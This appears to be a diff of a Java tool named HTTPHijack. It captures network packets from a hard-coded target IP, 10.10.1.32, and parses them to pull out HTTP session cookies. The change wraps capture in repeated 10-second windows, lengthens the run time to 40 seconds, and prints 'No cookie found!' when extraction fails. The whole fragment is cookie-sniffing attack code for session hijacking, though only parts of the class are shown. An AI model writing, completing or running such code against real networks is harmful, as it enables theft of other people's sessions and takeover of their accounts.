@@ -60,8 +60,10 @@ public class HTTPHijack {
             for(int i = 0; i < 64 ; i++) {
                 packetWriter.write(String.valueOf(handle.getNextPacketEx()));
             }
-        } catch (PcapNativeException | TimeoutException | NotOpenException | NullPointerException | IOException e) {
+        } catch (PcapNativeException | NotOpenException | NullPointerException | IOException e) {
             e.printStackTrace();
+        } catch (TimeoutException e){
+            System.out.println("Sniffing over!");
         }
         handle.close();
         try {
@@ -125,22 +127,31 @@ public class HTTPHijack {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        return output;
+        return null;
     }
 
     public static String[] Hijacker(String target, int timeout){
         OpenFile("DataOutput.txt");
         OpenFile("PacketsOutput.txt");
-        WritePackets(target, timeout);
-        StripPackets();
-        return StripData();
+        for(int i = 0; i < timeout/10; i++) {
+            WritePackets(target, 10);
+            StripPackets();
+            String[] ans = StripData();
+            if(ans != null)
+                return ans;
+        }
+        return null;
     }
 
     public static void main(String[] args) {
         String target = "10.10.1.32";
-        int time = 10;//in seconds
+        int time = 40;//in seconds
         String[] ans = Hijacker(target, time);
-        System.out.println(ans[0]);
-        System.out.println(ans[1]);
+        try {
+            System.out.println(ans[0]);
+            System.out.println(ans[1]);
+        } catch (NullPointerException e){
+            System.out.println("No cookie found!");
+        }
     }
 }
